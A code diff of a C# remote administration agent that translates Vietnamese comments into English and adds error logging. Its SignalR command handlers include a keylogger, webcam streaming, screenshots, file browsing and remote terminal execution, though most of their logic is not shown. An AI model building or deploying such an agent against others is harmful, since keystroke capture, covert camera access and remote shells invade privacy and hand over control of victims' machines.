@@ -15,13 +15,13 @@ namespace AgentApp
 {
     class Program
     {
-        // For Keylogger API
+        // Windows API implementation for Keylogger
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
         private static bool _isKeylogging = false;
 
-        // For Webcam Streaming
+        // Variables for Webcam stream handling
         private static VideoCaptureDevice _videoSource;
         private static HubConnection _connection;
         private static bool _firstFrameSent = false;
@@ -50,14 +50,15 @@ namespace AgentApp
                 .WithAutomaticReconnect()
                 .Build();
 
+            // SignalR Connection Event Handlers
             _connection.Closed += async (error) =>
             {
                 Console.WriteLine("Connection lost. Reconnecting...");
-                await Task.Delay(new Random().Next(0, 5) * 1000);
+                await Task.Delay(new Random().Next(0, 5) * 1000); // Random backoff
                 await _connection.StartAsync();
             };
 
-            // Register handlers for Hub commands
+            // Register handlers for Hub commands (Process Management)
             _connection.On<string>("GetProcessesCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetProcessesCommand");
@@ -96,7 +97,7 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Applications Management ---
+            // Application Management
             _connection.On<string>("GetApplicationsCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetApplicationsCommand");
@@ -135,20 +136,22 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Power Management ---
+            // System Power Management
             _connection.On("ShutdownCommand", () =>
             {
                 Console.WriteLine("Command Received: ShutdownCommand");
-                try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
+                try { Process.Start("shutdown.exe", "/s /t 0"); } 
+                catch (Exception ex) { Console.WriteLine($"Shutdown failed: {ex.Message}"); }
             });
 
             _connection.On("RestartCommand", () =>
             {
                 Console.WriteLine("Command Received: RestartCommand");
-                try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
+                try { Process.Start("shutdown.exe", "/r /t 0"); } 
+                catch (Exception ex) { Console.WriteLine($"Restart failed: {ex.Message}"); }
             });
 
-            // --- NEW: Screen Capture ---
+            // Screen Capture Management
             _connection.On<string>("TakeScreenshotCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: TakeScreenshotCommand");
@@ -185,7 +188,7 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: File & Directory Manager ---
+            // File & Directory Management
             _connection.On<string, string>("GetDirectoryContentsCommand", async (adminConnectionId, path) =>
             {
                 Console.WriteLine($"Command Received: GetDirectoryContentsCommand for path: '{path}'");
@@ -193,7 +196,7 @@ namespace AgentApp
                 {
                     if (string.IsNullOrWhiteSpace(path))
                     {
-                        // Nếu đường dẫn rỗng, trả về danh sách các Ổ đĩa (Drives)
+                        // Return list of available system drives if path is empty
                         var drives = DriveInfo.GetDrives().Where(d => d.IsReady).Select(d => new
                         {
                             Type = "Drive",
@@ -223,7 +226,7 @@ namespace AgentApp
                     } 
                     catch (UnauthorizedAccessException)
                     {
-                        // Bỏ qua lỗi truy cập
+                        // Ignore folders where we don't have access permissions
                         Console.WriteLine("Access denied to some folders.");
                     }
 
@@ -285,6 +288,7 @@ namespace AgentApp
                 }
             });
 
+            // Keylogger implementation
             _connection.On<string>("StartKeyloggerCommand", (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: StartKeyloggerCommand");
@@ -385,7 +389,7 @@ namespace AgentApp
                 _isKeylogging = false;
             });
 
-            // --- NEW: Terminal ---
+            // Remote Terminal Command Execution
             _connection.On<string, string>("ExecuteTerminalCommand", async (adminConnectionId, command) =>
             {
                 Console.WriteLine($"Command Received: ExecuteTerminalCommand for: {command}");
@@ -427,14 +431,14 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Webcam Stream ---
+            // Webcam Streaming Implementation
             _connection.On<string>("GetWebcamsCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetWebcamsCommand");
                 string json = "[]";
                 try
                 {
-                    // Chạy ngầm trong 1 luồng STA (COM DirectShow yêu cầu) để tránh bị treo cứng (hang/deadlock)
+                    // Run finding hardware in an STA thread to avoid COM Interop freezes/deadlocks
                     Thread t = new Thread(() =>
                     {
                         try
@@ -447,11 +451,14 @@ namespace AgentApp
                             }
                             json = JsonSerializer.Serialize(cameras);
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Camera fetch error: {ex.Message}");
+                        }
                     });
                     t.SetApartmentState(ApartmentState.STA);
                     t.Start();
-                    t.Join(5000); // Đợi tối đa 5 giây tránh treo vĩnh viễn
+                    t.Join(5000); // 5 seconds max wait to prevent permanent lock
 
                     await _connection.InvokeAsync("SendWebcamsResult", adminConnectionId, json);
                 }
@@ -613,7 +620,7 @@ namespace AgentApp
 
                             if (!_firstFrameSent)
                             {
-                                Console.WriteLine("Thành công! Frame hình ảnh đầu tiên đã được gửi đi. Camera đang stream.");
+                                Console.WriteLine("Success! First image frame transmitted. Camera stream active.");
                                 _firstFrameSent = true;
                             }
                         }
@@ -628,8 +635,8 @@ namespace AgentApp
 
         private static void video_VideoSourceError(object sender, VideoSourceErrorEventArgs eventArgs)
         {
-            Console.WriteLine($"[CAMERA LỖI] {eventArgs.Description}");
-            Console.WriteLine("-> NGUYÊN NHÂN THƯỜNG GẶP: Camera đang bị một phần mềm khác sử dụng (VD: Bạn đang mở sẵn app Camera của Windows, OBS, hoặc Zalo/Zoom). Hãy đóng app đó lại!!");
+            Console.WriteLine($"[CAMERA ERROR] {eventArgs.Description}");
+            Console.WriteLine("-> COMMON CAUSE: The camera is currently being used by another application (e.g., Windows Camera app, OBS, Zoom, Skype). Please close the other application!");
         }
     }
 }
